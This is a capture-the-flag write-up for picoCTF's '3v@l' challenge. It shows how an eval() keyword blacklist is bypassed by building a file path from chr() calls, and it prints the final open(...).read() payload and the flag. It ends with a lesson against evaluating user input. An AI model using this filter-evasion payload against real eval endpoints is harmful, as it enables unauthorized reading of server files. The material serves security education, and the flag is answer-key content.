## 3v@l

This challenge revolves around exploiting the `eval()` function — classic. From inspecting **Dev Tools > Elements**, we can tell that some characters and **keywords are blacklisted**, and **regex** is involved to block certain patterns:

![image](https://github.com/user-attachments/assets/0bee92ae-6375-4b2c-94d2-a86459324b90)

So the idea: `eval()` is definitely being used on the input, **but** a bunch of "dangerous" words are blocked. That means stuff like `import`, `__`, `os`, `subprocess`, etc., are **off-limits**.

But who says we need them?

Instead of using blacklisted words, we go around it. Let’s go with something lowkey like:  
```python
chr(47)
```
That's just `'/'` in ASCII. 🧠

Build the filename with `chr()`:
```python
chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)
```
Which gives us:
```python
'/flag.txt'
```

Cool. Now just wrap it in:
```python
open(...).read()
```

Final payload:
```python
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

Result:  
![image](https://github.com/user-attachments/assets/e927dd46-92f0-4b16-894d-f3fb4561b25d)

✅ Flag:
```
picoCTF{D0nt_Use_Unsecure_f@nctionsd062d012}
```

---

### 💡 Lesson Learned:
Never blindly `eval()` user input. If you must, **sanitize properly** and even then, it's still risky. `eval()` is one of those functions that can **go nuclear** if misused.

---

### ❓Why `open()` and not `popen()`?
Simple — `popen()` is used for **executing shell commands**, which is way more dangerous and almost **always blacklisted** in CTFs like this. But here, we’re not trying to run a shell command, we’re just trying to **read a local file**.  
So `open()` is cleaner, subtler, and gets the job done **without triggering the blacklist**.

